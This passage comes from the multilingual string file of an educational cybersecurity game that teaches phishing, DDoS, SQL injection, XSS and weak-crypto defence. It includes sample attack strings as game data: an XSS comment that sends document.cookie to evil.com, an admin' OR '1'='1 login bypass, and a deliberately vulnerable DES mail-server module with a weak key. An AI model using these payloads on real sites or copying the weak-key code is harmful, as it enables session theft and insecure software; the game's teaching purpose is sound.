        loss: "Mission Failed. The ransomware encrypted critical systems before you could deploy the countermeasure."
      }
    },
    // Level 9
    level9: {
      hints: {
        intro: "You received a new email from HR. It looks urgent... Open your Email box to read it.",
        suspicious: "This email looks suspicious! HR would never ask to disable firewalls. It could be a social engineering attempt. Check the SIEM for unusual activity.",
        mitm: "ALERT! SIEM detected a Man-in-the-Middle (MITM) attack! Someone is intercepting communications. This might be linked to the suspicious email request. We should check the email server code.",
        crypto: "DES (Data Encryption Standard) is an obsolete and vulnerable algorithm. DES 'weak keys' produce identical subkeys, making encryption predictable. Open Code Editor to examine and fix the code.",
        fix: "In Code Editor, replace DES algorithm with AES-256. Also replace the weak key with a secure random key, you can use get_random_bytes(). Then go to Terminal to build and update the server.",
        victory: "SYSTEM UPDATED! You successfully fixed the cryptographic vulnerability. The email server now uses AES-256, a much more secure algorithm than obsolete DES.",
        success: "Great! You replaced DES with AES. Now go to Terminal and run: build mail_server and then update mail_server",
        failAES: "Code is not correct yet. You must replace all occurrences of DES with AES.",
        failDES: "Almost! There are still occurrences of DES in the code. Replace all of them with AES."
      },
      emails: {
        hr: {
          subject: "URGENT: Disable all Firewalls",
          preview: "For scheduled maintenance, we request disabling all firewalls...",
          body: "Dear IT Team,\n\nFor scheduled system maintenance, we request disabling ALL corporate firewalls IMMEDIATELY.\n\nThis operation is necessary to allow updates of main servers. Once maintenance is complete (approx 2 hours), you can reactivate protections.\n\nINSTRUCTIONS:\n1. Access firewall control panel\n2. Disable all blocking rules\n3. Confirm via email once disabled\n\nThis request comes directly from Management.\n\nBest regards,\nHR Department\nCyberShield Corp",
          explanation: "Suspicious email: HR should never ask to disable firewalls."
        },
        security: {
          subject: "Weekly Security Report",
          preview: "Summary of security activities for the week...",
          body: "Weekly Security Report - CyberShield Corp\n\nActivity Summary:\n- 0 threats detected\n- 15 blocked access attempts\n- OS at 100%\n\nNext report: Next Monday.",
          explanation: "Routine legitimate email."
        }
      },
      logs: {
        system: "System started correctly",
        auth: "User authentication successful: admin@cybershield",
        email: "Unusual connection detected on port 25",
        mitm: "🚨 MITM ATTACK DETECTED! Intercepting communications on SMTP channel. Suspicious IP: 198.51.100.42"
      },
      terminal: {
        initialHistory: [
          "$ CyberShield Security Terminal v3.2.1",
          "$ Type \"help\" for available commands",
          "$ Type \"status\" to verify service status",
          ""
        ],
        help: "Available commands: help, build, update, status, clear",
        status: {
          win: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0\n\n🏆 Congratulations! System completely secure!",
          built: "✅ Mail Server: ONLINE (AES-256)\n   Status: Secure\n   Vulnerabilities: 0",
          fixed: "⚠️ Mail Server: ONLINE (DES - VULNERABLE)\n   Status: Requires rebuild\n   Vulnerabilities: 1 CRITICAL",
          vuln: "🔴 Mail Server: ONLINE (DES - VULNERABLE)\n   Status: At risk\n   Vulnerabilities: 1 CRITICAL"
        },
        build: {
          error: "❌ Error: Fix vulnerabilities in source code first.\n   Use Code Editor to edit mail_server.py",
          success: "🔨 Building mail_server...\n   [====================================] 100%\n✅ Build completed successfully!\n   Output: mail_server_v2.2.0.bin\n   \nRun 'update mail_server' to apply changes.",
          hint: "✅ Build completed! Now run update to apply changes.",
          usage: "Usage: build <service_name>\nExample: build mail_server"
        },
        update: {
          error: "❌ Error: Run 'build mail_server' first",
          successHint: "System updated! Run 'status' to verify final server status.",
          output: "🔄 Updating mail_server...\n   Stopping service...          [OK]\n   Backing up config...         [OK]\n   Installing new version       [OK]\n   Verifying integrity...       [OK]\n   Restarting service...        [OK]\n\n✅ UPDATE COMPLETED!\n   Version: 2.2.0\n   Encryption: AES-256\n   Status: SECURE\n\n🛡️ Vulnerability fixed successfully!",
          usage: "Usage: update <service_name>\nExample: update mail_server"
        }
      },
      files: {
        mail_server: `# CyberShield Mail Server - Encryption Module
# Version: 2.1.3
# Last Updated: 2024-01-15

from Crypto.Cipher import DES
import base64

# Encryption Configuration
ENCRYPTION_ALGORITHM = "DES"

# Encryption Key for communications
ENCRYPTION_KEY = b"\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01"

def encrypt_message(message):
    """
    Encrypts email messages for secure transmission.
    Uses DES for legacy system compatibility.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    # Message padding to multiples of 8 bytes
    padded_message = message + (8 - len(message) % 8) * ' '
    
    encrypted = cipher.encrypt(padded_message.encode())
    return base64.b64encode(encrypted).decode()

def decrypt_message(encrypted_message):
    """
    Decrypts received email messages.
    """
    cipher = DES.new(ENCRYPTION_KEY, DES.MODE_ECB)
    
    decoded = base64.b64decode(encrypted_message)
    decrypted = cipher.decrypt(decoded)
    
    return decrypted.decode().strip()

def send_secure_email(recipient, subject, body):
    """
    Sends an encrypted email.
    """
    encrypted_body = encrypt_message(body)
    # ... rest of sending logic
    pass

# Server initialization
if __name__ == "__main__":
    print("Mail Server started with encryption", ENCRYPTION_ALGORITHM)
    print("Key configured: [REDACTED]")
`
      },
      debrief: {
        win: "VULNERABILITY FIXED: DES Weak Keys\n\nDES (Data Encryption Standard) is an obsolete encryption algorithm with 56-bit keys, easily broken by modern brute-force attacks.\n\nDES \"Weak Keys\" are 4 special keys (like 0x0101010101010101) that produce identical subkeys during encryption. This means:\n• Encrypting twice equals decrypting\n• Attackers can predict cryptographic patterns\n• Man-in-the-Middle attacks become trivial\n\nYou replaced DES with AES-256, a modern algorithm with 256-bit keys, making the system secure against these attacks.",
        loss: "Mission Failed. The cryptographic vulnerability was not fixed in time. Attackers exploited DES weak keys to intercept and decrypt email server communications."
      }
    },
    // Tutorial
    tutorial: {
      title: "TUTORIAL - SIEM Dashboard",
      subtitle: "Sicherheitsinformations- und Ereignisverwaltung",
      logStream: "LOG-STREAM",
      analysis: "ANALYSE",
      source: "Quelle",
      severity: "Schweregrad",
      threat: "Bedrohung",
      message: "Nachricht",
      yes: "JA",
      no: "NEIN",
      selectLog: "Wählen Sie ein Log zur Analyse aus",
      analyzeBtn: "BEDROHUNG ANALYSIEREN",
      blockBtn: "IP BLOCKIEREN",
      showHelp: "HILFE ANZEIGEN",
      hideHelp: "HILFE AUSBLENDEN",
      exit: "BEENDEN",
      success: "ABGESCHLOSSEN!",
      successMsg: "Sie haben das SIEM-Tutorial abgeschlossen! Zurück zur Karte...",
      hints: {
        step0: "Beginnen Sie mit der Überprüfung Ihrer E-Mails! Klicken Sie auf das E-Mail-Symbol und lesen Sie die Sicherheitsmeldung. Das ist der Anfang!",
        step1: "Gut! Schauen Sie sich jetzt das SIEM-Dashboard (Panel unten) an. KLICKEN Sie auf das rote KRITISCH-Log, um es im Detail zu analysieren!",
        step2: "Perfekt! Verwenden Sie jetzt den Browser, um Informationen zu suchen. Besuchen Sie \"SQL Injection Info\", um zu verstehen, wie dieser Angriff funktioniert.",
        step3: "Gut! Öffnen Sie das Terminal und geben Sie \"show-logs\" ein, um alle Logs zu sehen. Sie finden die verdächtige IP!",
        step4_attempt0: "Sie haben mehrere IPs in den Logs gefunden! Versuchen Sie, diejenige zu blockieren, die Ihnen verdächtig erscheint. Geben Sie \"help\" im Terminal ein, um die Befehle zu sehen.",
        step4_attempt1: "TIPP: Versuchen Sie, die IP 192.168.1.100 mit dem Befehl \"block-ip 192.168.1.100\" zu blockieren. Schauen wir, was passiert!",
        step4_mistake: "Haben Sie gesehen? Das Blockieren der falschen IP lässt Ihre Gesundheitsleiste sinken! Blockieren Sie jetzt die richtige: 203.0.113.42",
        step4_correct: "Der richtige Befehl ist: \"block-ip 203.0.113.42\" - das ist die böse IP, die SQL-Injection versucht hat."
      }
    },
    // Level Map
    levelMap: {
      title: "LEVEL-KARTE",
      back: "ZURÜCK",
      stars: "Sterne",
      play: "SPIELEN",
      levelInfo: {
        tutorial: { name: "SIEM-Tutorial", description: "Lernen Sie die Grundlagen eines SIEM-Systems (Security Information and Event Management) und wie man Bedrohungen erkennt." },
        level1: { name: "Netzwerk-Grundlagen", description: "Lernen Sie die Grundlagen der Netzwerksicherheit und identifizieren Sie häufige Schwachstellen." },
        level2: { name: "Firewall-Verteidigung", description: "Konfigurieren und verwalten Sie Firewall-Regeln zum Schutz Ihres Netzwerkperimeters." },
        level3: { name: "Verschlüsselungsprotokoll", description: "Beherrschen Sie Verschlüsselungstechniken zur Sicherung sensibler Datenübertragungen." },
        level4: { name: "Einbruchserkennung", description: "Erkennen und reagieren Sie in Echtzeit auf unbefugte Zugriffsversuche." },
        level5: { name: "Malware-Analyse", description: "Identifizieren und neutralisieren Sie bösartige Software-Bedrohungen, bevor sie sich verbreiten." },
        level6: { name: "Social Engineering", description: "Verteidigen Sie sich gegen Phishing- und Social-Engineering-Angriffe." },
        level7: { name: "Webanwendungssicherheit", description: "Sichern Sie Webanwendungen gegen häufige Schwachstellen wie SQL-Injection." },
        level8: { name: "Vorfallreaktion", description: "Koordinieren Sie wirksame Reaktionen auf Sicherheitsverletzungen und Vorfälle." },
        level9: { name: "Fortgeschrittene Persistente Bedrohungen", description: "Bekämpfen Sie ausgeklügelte, langfristige Cyberangriffskampagnen." }
      }
    },
    // Options
    options: {
      title: "OPTIONEN",
      back: "ZURÜCK",
      settings: "EINSTELLUNGEN",
      about: "ÜBER",
      credits: "CREDITS",
      language: "Sprache",
      audio: "Audio",
      musicVolume: "Musiklautstärke",
      sfxVolume: "Effektlautstärke",
      saveSettings: "Einstellungen Speichern",
      saveConfirm: "Einstellungen erfolgreich gespeichert!",
      lastSaved: "Zuletzt gespeichert:",
      aboutTitle: "Über CyberShield Command",
      aboutContent: {
        p1: "CyberShield Command ist ein pädagogisches Serious Game, das entwickelt wurde, um Cybersicherheitsprinzipien durch interaktives Gameplay und realistische Szenarien zu vermitteln.",
        p2: "Navigieren Sie durch 9 herausfordernde Level, die sich jeweils auf verschiedene Aspekte der Cybersicherheit konzentrieren, einschließlich Netzwerksicherheit, Verschlüsselung, Einbruchserkennung, Malware-Analyse und fortgeschrittene persistente Bedrohungen.",
        p3Objective: "Ziel:",
        p3: "Meistern Sie wesentliche Cybersicherheitsfähigkeiten während Sie gegen verschiedene Cyber-Bedrohungen verteidigen. Verdienen Sie bis zu 3 Sterne pro Level basierend auf Ihrer Leistung.",
        version: "Version:",
        projectType: "Projekttyp:",
        projectTypeValue: "Serious Game für Cybersicherheitsbildung",
        year: "Jahr:"
      },
      creditsTitle: "Credits",
      creditsContent: {
        devTeam: "Entwicklungsteam",
        teamMembers: [
          { name: "Alessandro Boffolo", role: "Spieldesigner & Entwickler" },
          { name: "Nicola Balzano", role: "Backend-Entwickler" },
          { name: "Narcis Paviliuc", role: "Frontend-Entwickler" }
        ],
        gameDesign: "Spieldesign & Entwicklung",
        magistrale: "Magistrale - Serious Games for Cyber Security",
        specialThanks: "Besonderer Dank",
        advisors: "Bildungsberater",
        experts: "Cybersicherheitsexperten",
        testers: "Beta-Tester",
        tech: "Verwendete Technologien",
        assets: "Assets & Ressourcen",
        icons: "Icons: Unicode Emoji",
        palette: "Farbpalette: Benutzerdefiniertes Cyber-Thema",
        copyright: "© 2026 CyberShield Command. Alle Rechte vorbehalten."
      }
    }
  },
  espanol: {
    // Home
    home: {
      title: "CYBERSHIELD\nCOMMAND",
      subtitle: "Interfaz Avanzada de Defensa Cibernética",
      play: "JUGAR",
      continua: "CONTINUAR",
      newGame: "NUEVO JUEGO",
      options: "OPCIONES"
    },
    // Level 1: Phishing
    level1: {
      emails: [
        {
          id: 1,
          from: 'security@paypa1.com',
          timestamp: 'Hoy 09:15',
          subject: 'URGENTE: Su cuenta ha sido bloqueada',
          preview: 'Hemos detectado actividad sospechosa...',
          body: 'Estimado Cliente,\n\nHemos detectado un acceso no autorizado a su cuenta de PayPal. Por su seguridad, la cuenta ha sido bloqueada temporalmente.\n\nHaga clic aquí para verificar su identidad y desbloquear la cuenta: http://paypa1-verify.com/login\n\nSi no actúa en 24 horas, la cuenta se cerrará permanentemente.\n\nSoporte PayPal',
          explanation: 'PHISHING: Dominio del remitente falsificado ("paypa1" en lugar de "paypal"), sentido de urgencia ("bloqueada", "24 horas"), enlace a dominio no oficial.',
          links: ['http://paypa1-verify.com/login']
        },
        {
          id: 2,
          from: 'hr@yourcompany.com',
          timestamp: 'Hoy 10:30',
          subject: 'Actualización de política',
          preview: 'Por favor revise el nuevo documento...',
          body: 'Hola,\n\nAdjunto encontrará el documento actualizado sobre las nuevas políticas de trabajo remoto, vigentes a partir del próximo mes.\n\nContacte a RRHH si tiene dudas.\n\nSaludos cordiales,\nEquipo RRHH\nYourCompany Inc.',
          attachmentName: 'smart_working_policy_v2.pdf',
          explanation: 'LEGÍTIMO: Correo interno del dominio corporativo correcto, tono profesional, adjunto PDF (formato seguro).'
        },
        {
          id: 3,
          from: 'ceo.urgent123@gmail.com',
          timestamp: 'Hoy 14:55',
          subject: 'Transferencia Urgente',
          preview: 'Necesito que proceses este pago...',
          body: 'Hola,\n\nEstoy en una reunión y no puedo hablar. Necesito que organices una transferencia urgente para un nuevo proveedor inmediatamente. Es vital para cerrar el trato hoy.\n\nEnviaré detalles en breve. Responde tan pronto leas esto.\n\nEnviado desde mi iPhone',
          explanation: 'PHISHING (Fraude del CEO): El remitente usa un Gmail genérico, crea alta urgencia y presión psicológica.'
        },
        {
          id: 4,
          from: 'support@microsoft.com',
          timestamp: 'Hoy 15:20',
          subject: 'Su suscripción Microsoft 365',
          preview: 'Recibo de renovación automática...',
          body: 'Estimado Usuario,\n\nSu suscripción a Microsoft 365 se ha renovado automáticamente según lo programado. Puede encontrar el recibo en su cuenta.\n\nSi tiene preguntas, visite support.microsoft.com\n\nMicrosoft Team',
          explanation: 'LEGÍTIMO: Dirección oficial de Microsoft, sin solicitud de datos sensibles o enlaces extraños.',
          links: ['https://support.microsoft.com']
        },
        {
          id: 5,
          from: 'winner@lottery-prize.xyz',
          timestamp: 'Hoy 16:45',
          subject: '¡HAS GANADO UN IPHONE 15!!!',
          preview: '¡Felicidades! Eres el visitante...',
          body: '¡FELICITACIONES!!!\n\nHas sido seleccionado como ganador de nuestro premio mensual. ¡Has ganado un nuevo iPhone 15 Pro Max!\n\nDescarga el formulario adjunto para reclamar tu premio en 1 hora!\n\nHaz clic aquí: http://claim-prize-now.xyz/win',
          attachmentName: 'win_form.exe',
          explanation: 'PHISHING: Oferta demasiado buena para ser verdad, dominio sospechoso (.xyz), adjunto ejecutable (.exe).',
          links: ['http://claim-prize-now.xyz/win']
        },
        {
          id: 6,
          from: 'newsletter@tech-news.com',
          timestamp: 'Ayer 18:30',
          subject: 'Noticias Tech de la Semana',
          preview: 'Aquí está lo que pasó...',
          body: 'Hola,\n\nAquí tienes tu resumen semanal de las noticias tecnológicas más importantes:\n\n1. Nuevos procesadores cuánticos anunciados\n2. Ley de IA aprobada en la UE\n3. Avances en ciberseguridad\n\nLee más en nuestro sitio.\n\nTech News Team\nCancelar suscripción',
          explanation: 'LEGÍTIMO: Boletín típico, enlaces consistentes, sin solicitudes extrañas.',
          links: ['https://tech-news.com/weekly']
        }
      ],
      hints: {
        step0: 'Abre cada correo y verifica el remitente. Haz clic en la dirección para ver el dominio completo. Busca errores como "paypa1.com".',
        step1: 'Usa el botón "Inspeccionar Encabezados" para ver detalles técnicos. SPF y DKIM en "FAIL" indican que el correo no es auténtico.',
        step2: 'Lee el contenido cuidadosamente. Cuidado con: solicitudes urgentes, errores gramaticales, solicitudes de dinero/contraseña.',
        step3a: '✅ ¡Sigue así! Clasifica cada correo como "Correo Seguro" o "Reportar Phishing".',
        step3b: '¡Cuidado con los adjuntos! Un archivo .exe es una gran señal de alerta.',
        step3c: '¡Lo estás haciendo bien! En caso de duda, mejor marcar como phishing. ¡Quedan pocos correos!',
        default: '✅ ¡Sigue así! Clasifica cada correo. ¡Cuidado con los adjuntos .exe!'
      },
      browser: {
        paypal: {
          title: 'Sitio Oficial de PayPal',
          urlInfo: 'URL Correcta: https://paypal.com',
          ssl: 'Certificado SSL Válido ✅'
        },
        google: {
          title: 'Cómo reconocer correos de phishing',
          dangerTitle: '⚠️ Señales de advertencia:',
          dangerList: [
            'Remitente sospechoso o desconocido',
            'Errores ortográficos en el dominio',
            'Solicitudes urgentes de acción',
            'Enlaces que no coinciden con el dominio declarado'
          ],
          safeTitle: '✅ Siempre verifica:',
          safeList: [
            'SPF y DKIM en encabezados',
            'Dominio del remitente',
            'Destino del enlace'
          ]
        }
      },
      debrief: {
        success: {
          title: 'ANÁLISIS DE DETECCIÓN DE PHISHING',
          resultExcellent: 'RESULTADO: EXCELENTE - ¡Identificación perfecta de todos los correos de phishing!',
          resultGood: 'RESULTADO: BUENO - Identificaste casi todos los phishing correctamente.',
          resultAcceptable: 'RESULTADO: ACEPTABLE - Completaste el nivel pero con algunos errores.',
          classified: 'Correos clasificados:',
          correct: 'Identificaciones correctas:',
          precision: 'Precisión:',
          time: 'Tiempo de finalización:'
        },
        failure: {
          title: 'DETECCIÓN DE PHISHING FALLIDA',
          message: 'Cometiste demasiados errores.\n\nIntenta clasificar con más cuidado:\n- Verifica el dominio\n- Inspecciona SPF y DKIM\n- Verifica enlaces sospechosos'
        }
      }
    },
    // Level 2: DDoS
    level2: {
      hints: {
        step0: '¡El sitio corporativo está bajo ataque DDoS! Analice los registros SIEM para identificar IP maliciosas. Abra la TERMINAL y use "help".',
        step1: 'Use "list-ips" en la terminal. Bloquee los maliciosos con "block <ip>".',
        step2: 'Continúe bloqueando IP con alto tráfico (🔴). ¡Cuidado con no bloquear las legítimas (🟢)!',
        step3: '¡Casi listo! Bloquee todas las IP maliciosas para detener el ataque.',
        default: '¡Bloquee todas las IP maliciosas para completar la misión!'
      },
      logs: {
        flood: 'HTTP flood detected - 500 requests/sec from single source',
        abnormal: 'Abnormal traffic pattern - Repeated GET requests to homepage',
        normal: 'Normal user activity - Page load successful',
        distributed: 'Distributed attack pattern detected - Multiple IPs with similar behavior',
        resource: 'Server resource exhaustion - CPU at 98%, Memory at 95%'
      },
      browser: {
        company: {
          title: 'Sitio Corporativo',
          errorTitle: '503 - Servicio No Disponible',
          errorDesc: 'El servidor no puede manejar la solicitud en este momento.',
          errorDetails: 'Error: Connection timeout\nToo many requests to server',
          restoredTitle: '🎉 ¡Sitio Restaurado!',
          restoredDesc: 'Ataque DDoS mitigado con éxito.\nEl tráfico ha vuelto a la normalidad.',
          online: '✓ EN LÍNEA'
        },
        owasp: {
          title: 'OWASP - Ataques DDoS',
          introTitle: '🎯 ¿Qué es un ataque DDoS?',
          introText: 'Denegación de Servicio Distribuida: ataque que inutiliza un servicio sobrecargándolo con tráfico.',
          indicatorsTitle: '⚠️ Indicadores DDoS:',
          indicatorsList: [
            'Tráfico de red repentinamente alto',
            'Muchas solicitudes de diferentes IP pero patrón similar',
            'Servidor lento o inalcanzable',
            'CPU/RAM al máximo'
          ],
          mitigationTitle: '✅ Técnicas de mitigación:',
          mitigationList: [
            'Rate Limiting: Limita solicitudes por IP',
            'Firewall: Bloquea tráfico sospechoso',
            'IP Blocking: Bloquea fuentes maliciosas',
            'Traffic Analysis: Identifica patrones anormales'
          ]
        }
      },
      terminal: {
        header: '$ CyberShield Security Terminal - Módulo Mitigación DDoS',
        help: 'Uso: block <ip>\nEjemplo: block 203.0.113.42',
        alreadyBlocked: '[!] IP ya bloqueada',
        maliciousBlocked: '[✓] ¡IP maliciosa bloqueada con éxito!\n[+] Tráfico DDoS reducido',
        legitimateBlocked: '[✗] ADVERTENCIA: ¡Usuario legítimo!\n[!] Falso positivo detectado - Acceso denegado',
        ipBlocked: '[✓] IP bloqueada',
        firewallAlready: '[!] Firewall ya activo',
        firewallEnabled: '[✓] Reglas de firewall avanzadas habilitadas\n[+] Se filtrarán patrones de tráfico sospechosos',
        rateLimitAlready: '[!] Rate limiting ya activo',
        rateLimitEnabled: '[✓] Rate limiting HTTP habilitado\n[+] Máximo 100 solicitudes/minuto por IP\n[+] ¡Esto reduce significativamente los ataques flood!',
        status: {
          header: '=== ESTADO SEGURIDAD ===',
          attackActive: '🔴 ACTIVO',
          attackMitigated: '🟢 MITIGADO',
          traffic: 'Nivel Tráfico',
          firewall: 'Firewall',
          rateLimit: 'Rate Limiting',
          blocked: 'IP Bloqueadas',
          correct: 'Bloqueos Correctos',
          falsePos: 'Falsos Positivos',
          enabled: '✓ Habilitado',
          disabled: '✗ Deshabilitado'
        },
        analyze: {
          header: '=== ANÁLISIS TRÁFICO ===',
          requests: 'Solicitudes Totales: 12,450/seg (CRÍTICO)',
          protocol: 'Protocolo: 98% solicitudes HTTP GET',
          pattern: 'Patrón: Solicitudes repetidas al mismo endpoint',
          sources: 'fuentes de alto volumen detectadas',
          rec: 'Recomendación: Bloquear IP maliciosas y habilitar rate-limit'
        },
        listIps: {
          header: '=== DIRECCIONES IP SOSPECHOSAS ===',
          highVolume: 'Fuentes alto volumen:',
          normalUsers: 'Usuarios normales:'
        }
      },
      debrief: {
        success: {
          title: '¡ATAQUE DDOS MITIGADO!',
          message: 'Has bloqueado con éxito las IP maliciosas.',
          techniquesTitle: 'TÉCNICAS DEFENSA DDOS:',
          techniques: [
            'Rate Limiting: limita solicitudes por IP',
            'Firewall avanzado: filtra patrones sospechosos',
            'Análisis tráfico: identifica anomalías',
            'IP Blocking: bloquea fuentes maliciosas'
          ],
          conclusion: 'Estas técnicas combinadas son esenciales para proteger los sistemas contra ataques DDoS.'
        },
        failure: {
          title: 'MISIÓN FALLIDA',
          message: 'El sistema fue abrumado por el ataque DDoS.\n\nIntenta de nuevo bloqueando todas las IP maliciosas antes de que se acabe el tiempo.'
        },
        stats: {
          mitigated: 'Tráfico mitigado',
          blocked: 'IP maliciosas bloqueadas',
          falsePositives: 'Falsos positivos'
        }
      }
    },
    // Level 3: SQL Injection
    level3: {
      logMessages: {
        loginAttempt: 'Intento de inicio de sesión de usuario - usuario: john.doe',
        searchQuery: 'Consulta de búsqueda normal - palabra clave: laptop',
        sqliDetected: "¡Inyección SQL detectada! Payload: admin' OR '1'='1 -- Acceso concedido a usuario no autorizado."
      },
      hints: {
        step0: "Monitoree el SIEM para alertas de Inyección SQL.",
        step1: "Abra el EDITOR DE CÓDIGO y analice 'login.php': es vulnerable a Inyección SQL.",
        step2: "La consulta concatena directamente la entrada del usuario. El atacante usa: admin' OR '1'='1",
        step3: "Use SENTENCIAS PREPARADAS, compilan la consulta ANTES de los datos. Esto hace imposible la inyección SQL.",
        stepCode: "Aquí hay un ejemplo de cómo implementar SENTENCIAS PREPARADAS:\n$query = $db->prepare(\"SELECT * FROM users WHERE username=? AND password=?\");\n$query->bind_param(\"ss\", $username, $password);",
        step4: "¡Modificación completa! Use 'test-login' en la TERMINAL."
      },
      terminal: {
        initial: [
          '$ Terminal de Seguridad de Aplicaciones v3.0',
          '$ Monitoreando aplicación web...'
        ],
        alert: [
          '$ ALERTA: Vulnerabilidad de Inyección SQL detectada en login.php',
          '$ ACCIÓN REQUERIDA: Arregle la consulta usando sentencias preparadas.'
        ],
        modified: '$ login.php modificado. Listo para probar.',
        testLogin: {
          testing: '> Probando inicio de sesión con payload SQLi...',
          input: "> Entrada: username=admin' OR '1'='1",
          success: [
            '[ÉXITO] Entrada rechazada - La sentencia preparada protegió la consulta.',
            '[ÉXITO] Evasión de autenticación PREVENIDA.',
            '$ ¡MISIÓN CUMPLIDA! Vulnerabilidad de Inyección SQL parchada.'
          ],
          fail: [
            '[FALLO] ¡Acceso no autorizado concedido! Consulta aún vulnerable.',
            '$ ERROR: Debe usar sentencias preparadas con enlace de parámetros.'
          ]
        },
        analyzeCode: {
          header: '=== ANÁLISIS DE CÓDIGO: login.php ===',
          vuln: 'Vulnerabilidad: INYECCIÓN SQL (Alta Severidad)',
          loc: 'Ubicación: función authenticate_user()',
          issue: 'Problema: Concatenación directa de cadenas en consulta SQL',
          vector: "Vector de Ataque: ' OR '1'='1 --",
          rec: 'Recomendación: Use sentencias preparadas con mysqli_prepare()'
        },
        help: "Disponible: analyze-code, test-login, show-logs",
        notFound: "Comando no encontrado:"
      },
      debrief: {
        winTitle: 'VULNERABILIDAD IDENTIFICADA: Inyección SQL vía Concatenación de Cadenas.',
        winBody: 'Ha demostrado cómo las consultas SQL construidas mediante concatenación de cadenas son vulnerables a la inyección.',
        lesson: 'LECCIÓN APRENDIDA: Siempre use sentencias preparadas y parámetros vinculados para proteger la base de datos de entradas maliciosas.',
        loss: 'MISIÓN FALLIDA. La base de datos fue comprometida o se cometieron demasiados errores.'
      }
    },
    // Level 4: XSS Defense
    level4: {
      logMessages: {
        sanitizedFalse: 'Usuario john.doe publicó comentario - Contenido sanitizado: false',
        payloadDetected: 'Payload XSS detectado en comentario: <script>alert("XSS Attack!")</script>',
        blockedScript: 'Entrada sospechosa bloqueada: etiqueta <script> detectada y sanitizada',
        criticalExec: 'CRÍTICO: Ejecución de script detectada en navegador de usuario - Intento de robo de cookie',
        cspActive: 'Content Security Policy activa - Scripts en línea bloqueados',
        normalActivity: 'Actividad normal de usuario - Comentario publicado exitosamente',
        onerrorActive: 'XSS vía atributo onerror: <img src="x" onerror="..."> - Explotación activa',
        sanitizationActive: 'Sanitización HTML activa - Atributos peligrosos eliminados',
        iframeInjection: 'Inyección Iframe detectada: <iframe src="javascript:alert(\'XSS\')"> - Intento de manipulación del DOM',
        cspBlocked: 'Violación CSP bloqueada - Fuentes Iframe restringidas',
        sessionNormal: 'Actividad de sesión de usuario - Sin comportamiento sospechoso',
        multipleAttempts: 'Múltiples intentos XSS desde la misma IP - Patrón de ataque confirmado',
        allSanitized: 'Todas las entradas de usuario sanitizadas - Protección XSS completamente activa'
      },
      browser: {
        portal: {
          title: 'Portal de Empleados',
          header: 'Portal de Empleados Corporativo',
          vulnerable: '⚠️ VULNERABLE',
          secure: '✅ SEGURO',
          warningTitle: '⚠️ ADVERTENCIA DE SEGURIDAD',
          warningText: '¡Vulnerabilidades XSS detectadas! La entrada del usuario no está sanitizada.',
          warningRisk: 'Riesgo: Robo de cookies, secuestro de sesión, redirecciones maliciosas',
          secureTitle: '✅ MODO SEGURO',
          secureText: 'Sanitización de entrada activa. Content Security Policy aplicada.',
          secureProt: 'Protección: Escapado HTML, Encabezados CSP, Cookies HttpOnly',
          blockedLabel: '🛡️ BLOQUEADO',
          xssLabel: '🚨 XSS',
          scriptWarning: '⚠️ ¡Este script se ejecutaría en un navegador real!',
          addComment: 'Agregar Comentario',
          placeholder: 'Comparte tus pensamientos...',
          postBtn: 'Publicar comentario',
          comments: [
            { id: 1, text: '¡Excelente artículo! Gracias por compartir.' },
            { id: 2, text: 'Publicación muy informativa, esperando más contenido.' },
            { id: 3, text: '<script>alert("XSS Attack!")</script>Este es un comentario de prueba' },
            { id: 4, text: 'Tengo una pregunta sobre los detalles de implementación.' },
            { id: 5, text: '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">' },
            { id: 6, text: '<iframe src="javascript:alert(\'XSS\')">' }
          ]
        },
        dashboard: {
          title: 'Tablero de Seguridad Web',
          protections: {
            title: '🛡️ Protecciones Activas',
            html: 'Sanitización HTML',
            csp: 'Content Security Policy (CSP)',
            escaping: 'Escapado de Salida',
            httpOnly: 'Cookies HttpOnly',
            enabled: '✅ HABILITADO',
            disabled: '❌ DESHABILITADO'
          },
          risk: {
            title: '📊 Análisis de Riesgo XSS',
            level: 'Nivel de Riesgo Global',
            critical: 'CRÍTICO',
            low: 'BAJO',
            payloads: 'Payloads XSS Detectados:',
            execution: 'Ejecución de Script:',
            active: 'ACTIVA ⚠️',
            blocked: 'BLOQUEADA ✅',
            userData: 'Datos de Usuario en Riesgo:',
            yes: 'SÍ (Cookies, Sesiones)',
            no: 'NO'
          }
        }
      },
      terminal: {
        initial: [
          '$ Terminal de Seguridad Web v4.0',
          '$ Escriba "help" para comandos disponibles',
          '$ ⚠️  ADVERTENCIA: ¡Vulnerabilidades XSS detectadas en portal de empleados!'
        ],
        analyze: {
          header: '=== ANÁLISIS DE COMENTARIOS ===',
          total: 'Total comentarios:',
          safe: 'Comentarios seguros:',
          suspicious: 'Comentarios sospechosos:',
          patterns: 'Patrones XSS detectados:',
          action: '⚠️ Acción requerida: ¡Habilite sanitización de entrada!'
        },
        payload: {
          usage: 'Uso: show-payload <id_comentario>\nEjemplo: show-payload 3',
          safe: 'Comentario es seguro - sin XSS',
          header: '=== ANÁLISIS PAYLOAD XSS ===',
          vector: 'Vector de Ataque:',
          risk: 'Riesgo:',
          critical: 'CRÍTICO - ¡El script puede ejecutarse!',
          mitigated: 'MITIGADO - Payload bloqueado'
        },
        identify: {
          header: '=== IDENTIFICACIÓN TIPO XSS ===',
          type: 'Tipo: STORED XSS (XSS Persistente)',
          desc: 'Descripción: Scripts maliciosos almacenados en base de datos',
          loc: 'Ubicación: Comentarios de usuario en foro',
          impact: 'Afecta a todos los usuarios que ven la página',
          flow: 'Flujo de Ataque:\n1. Atacante publica comentario con etiqueta <script>\n2. Script almacenado en base de datos\n3. Script se ejecuta para cada usuario que ve',
          success: '✓ ¡Tipo XSS identificado exitosamente!'
        },
        enableSanitization: {
          already: '[!] Sanitización HTML ya habilitada',
          success: '[✓] Sanitización HTML habilitada\n[+] Etiquetas peligrosas eliminadas: <script>, <iframe>, <object>\n[+] Manejadores de eventos eliminados: onclick, onerror, onload\n[+] Riesgo XSS: SIGNIFICATIVAMENTE REDUCIDO'
        },
        enableCsp: {
          already: '[!] CSP ya habilitada',
          success: '[✓] Content Security Policy (CSP) habilitada\n[+] Scripts en línea bloqueados\n[+] Unsafe-eval deshabilitado\n[+] Frame-ancestors restringidos\n[+] Riesgo XSS: REDUCIDO'
        },
        enableEscaping: {
          already: '[!] Escapado de salida ya habilitado',
